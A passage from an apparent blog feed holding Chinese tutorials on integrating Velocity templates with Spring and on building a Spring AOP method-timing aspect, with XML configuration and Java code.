class="comment">#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/</span></span><br><span class="line"><span class="comment">#tools.view.servlet.error.template=/WEB-INF/vm/error.vm</span></span><br><span class="line"><span class="comment">#tools.view.servlet.layout.default.template=default.vm</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># runtime log</span></span><br><span class="line"><span class="meta">runtime.log</span>=<span class="string">velocity.log</span></span><br><span class="line"><span class="meta">runtime.log.logsystem.class</span>=<span class="string">org.springframework.ui.velocity.CommonsLoggingLogSystem</span></span><br><span class="line"><span class="meta">runtime.log.error.stacktrace</span>=<span class="string">true</span></span><br><span class="line"><span class="meta">runtime.log.warn.stacktrace</span>=<span class="string">true</span></span><br><span class="line"><span class="meta">runtime.log.info.stacktrace</span>=<span class="string">false</span></span><br><span class="line"><span class="meta">runtime.log.invalid.reference</span>=<span class="string">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、简单模板"><a href="#三、简单模板" class="headerlink" title="三、简单模板"></a>三、简单模板</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>$!title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题：$!title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容：$!content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>macro函数测试：#test()<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、模板渲染"><a href="#四、模板渲染" class="headerlink" title="四、模板渲染"></a>四、模板渲染</h2><p>使用VelocityEngineUtils能很方便的merge template。<br>需要准备一个Map，用于传递变量到VLT中。</p><p><strong>代码样例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; model = Maps.newHashMap();</span><br><span class="line">model.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;Velocity Template&quot;</span>);</span><br><span class="line">model.put(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;Content in Velocity Template&quot;</span>);</span><br><span class="line"></span><br><span class="line">String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, <span class="string">&quot;test.vm&quot;</span>, Constants.ENCODING, model);</span><br></pre></td></tr></table></figure><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ol><li><a href="http://wiki.apache.org/velocity/VelocityAndSpringStepByStep">VelocityAndSpringStepByStep</a></li><li><a href="http://mj4d.iteye.com/blog/1524050">velocity.properties配置说明</a></li><li><a href="http://blog.csdn.net/glarystar/article/details/6636574">springmvc 3.1整合velocity</a></li><li><a href="http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders">configuring_resource_loaders</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;此段内容说明如何整合spring与velocity。&lt;br&gt;此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。&lt;/p&gt;
&lt;h2 id=&quot;一、配置spring-mvc&quot;&gt;&lt;a href=&quot;#一、配置spring-mvc&quot; class=&quot;headerlink&quot; title=&quot;一、配置spring mvc&quot;&gt;&lt;/a&gt;一、配置spring mvc&lt;/h2&gt;&lt;p&gt;首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.&lt;/p&gt;
&lt;h2 id=&quot;velocity-engine实例化&quot;&gt;&lt;a href=&quot;#velocity-engine实例化&quot; class=&quot;headerlink&quot; title=&quot;velocity engine实例化&quot;&gt;&lt;/a&gt;velocity engine实例化&lt;/h2&gt;&lt;p&gt;对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。&lt;/p&gt;
&lt;p&gt;具体配置片段如下：&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;velocityEngine&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;org.springframework.ui.velocity.VelocityEngineFactoryBean&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;resourceLoaderPath&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;/WEB-INF/vm/&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;configLocation&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;classpath:velocity.properties&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。&lt;br&gt;&lt;strong&gt;注&lt;/strong&gt;：vm模板也可以放置到src/main/resources目录下。&lt;/p&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="velocity" scheme="http://yeshaoting.cn/tags/velocity/"/>
    
    <category term="实践" scheme="http://yeshaoting.cn/tags/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>spring特性实践 - AOP</title>
    <link href="http://yeshaoting.cn/article/spring/spring%E7%89%B9%E6%80%A7%E5%AE%9E%E8%B7%B5%20-%20AOP/"/>
    <id>http://yeshaoting.cn/article/spring/spring%E7%89%B9%E6%80%A7%E5%AE%9E%E8%B7%B5%20-%20AOP/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><p>此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。</p><h2 id="一、创建maven工程"><a href="#一、创建maven工程" class="headerlink" title="一、创建maven工程"></a>一、创建maven工程</h2><p>通过STS创建一个maven工程martinye-demo-spring-support。</p><p>修改pom.xml文件，添加项目相关依赖如下：</p><p><strong>servlet</strong></p><ul><li>javax.servlet-api</li><li>jstl</li><li>standard</li><li>jsp-api</li></ul><p><strong>spring</strong></p><ul><li>spring-webmvc</li><li>aspectjweaver</li></ul><p><strong>log</strong></p><ul><li>slf4j-api</li><li>slf4j-log4j12</li></ul><p><strong>utils</strong></p><ul><li>commons-lang3</li><li>commons-collections</li><li>commons-io</li><li>guava</li><li>fastjson</li></ul><p><strong>test</strong></p><ul><li>junit</li><li>spring-test</li></ul><span id="more"></span><h2 id="二、配置servlet容器"><a href="#二、配置servlet容器" class="headerlink" title="二、配置servlet容器"></a>二、配置servlet容器</h2><p>配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml</p><p>web servlet容器web.xml，添加加载spring容器的配置。<br>根据关注点不同，我们把spring容器配置定义分开，如下所示：</p><h3 id="定义spring-root容器"><a href="#定义spring-root容器" class="headerlink" title="定义spring root容器"></a>定义spring root容器</h3><p>实例化类对象。</p><p>配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-beans.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="定义spring-mvc容器"><a href="#定义spring-mvc容器" class="headerlink" title="定义spring mvc容器"></a>定义spring mvc容器</h3><p>处理用户请求。<br>spring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。</p><p>配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Processes application requests --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三、配置spring-beans-xml"><a href="#三、配置spring-beans-xml" class="headerlink" title="三、配置spring-beans.xml"></a>三、配置spring-beans.xml</h2><p>配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">ignore-resource-not-found</span>=<span class="string">&quot;true&quot;</span> <span class="attr">location</span>=<span class="string">&quot;classpath*:app.properties&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.martinye.demo&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.aspectj.lang.annotation.Aspect&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span> <span class="attr">expose-proxy</span>=<span class="string">&quot;true&quot;</span> <span class="attr">proxy-target-class</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>配置描述</strong>：</p><ol><li><p>加载配置资源：app.properties。</p></li><li><p>启用注解功能<br>除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。</p></li><li><p>开启aop，启用@AspectJ注解。<br>在注入当前容器的类对象方法上，支持AOP注解。</p></li></ol><h2 id="四、配置spring-mvc-xml"><a href="#四、配置spring-mvc-xml" class="headerlink" title="四、配置spring-mvc.xml"></a>四、配置spring-mvc.xml</h2><p>配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">ignore-resource-not-found</span>=<span class="string">&quot;true&quot;</span> <span class="attr">location</span>=<span class="string">&quot;classpath*:app.properties&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.martinye.demo&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.aspectj.lang.annotation.Aspect&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/views/&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span> <span class="attr">expose-proxy</span>=<span class="string">&quot;true&quot;</span> <span class="attr">proxy-target-class</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>配置描述</strong>：</p><ol><li><p>加载配置资源：app.properties。</p></li><li><p>启用注解功能<br>禁用默认的包扫描过滤策略，只扫描Controller注解。</p></li><li><p>开启aop，启用@AspectJ注解。<br>在注入当前容器的类对象方法上，支持AOP注解。</p></li></ol><h2 id="五、创建TimeCost注解"><a href="#五、创建TimeCost注解" class="headerlink" title="五、创建TimeCost注解"></a>五、创建TimeCost注解</h2><p>通过注解来开关是否需要进行方法耗时统计。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.martinye.demo.support.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span></span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yeshaoting</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2015-05-07 13:45:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.METHOD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> TimeCost &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="六、创建TimeCost切面"><a href="#六、创建TimeCost切面" class="headerlink" title="六、创建TimeCost切面"></a>六、创建TimeCost切面</h2><p>切面检测加有TimeCost的方法。</p><p>为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。<br>此优先级通过在切面类上添加<code>@Order</code>注解来完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.martinye.demo.support.aspect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.StopWatch;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.Signature;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.AfterReturning;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.AfterThrowing;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Around;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Pointcut;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 方法耗时切面</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yeshaoting</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2015-06-11 11:18:06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Order(8)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeCostAspect</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Pointcut(&quot;@annotation(com.martinye.demo.support.annotation.TimeCost)&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">point</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Before(value = &quot;point()&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeAdvice</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">&quot;======= before advice &#123;&#125; ======&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@After(value = &quot;point()&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterAdvice</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">&quot;======= after advice &#123;&#125; ======&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Around(value = &quot;point()&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aroundAdvice</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    logger.info(<span class="string">&quot;======= before around advice &#123;&#125; ======&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">    </span><br><span class="line">    StopWatch clock = <span class="keyword">new</span> StopWatch();</span><br><span class="line">    clock.start(); <span class="comment">// 计时开始</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      joinPoint.proceed();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      clock.stop(); <span class="comment">// 计时结束</span></span><br><span class="line">      <span class="keyword">long</span> timeCost = clock.getTime();</span><br><span class="line">      Signature sig = joinPoint.getSignature();</span><br><span class="line">      logger.info(<span class="string">&quot;execute method &#123;&#125;.&#123;&#125; take time: &#123;&#125;(ms)&quot;</span>, sig.getDeclaringTypeName(),</span><br><span class="line">          sig.getName(), timeCost);</span><br><span class="line">      </span><br><span class="line">      logger.info(<span class="string">&quot;======= after around advice &#123;&#125; ======&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@AfterThrowing(value = &quot;point()&quot;, throwing = &quot;e&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterThrowingAdvice</span><span class="params">(JoinPoint joinPoint, Throwable e)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">&quot;======= after throwing advice &#123;&#125; ======&quot;</span>, joinPoint.getSignature().getName());</span><br><span class="line">    logger.info(<span class="string">&quot; &gt; error info：&quot;</span> + 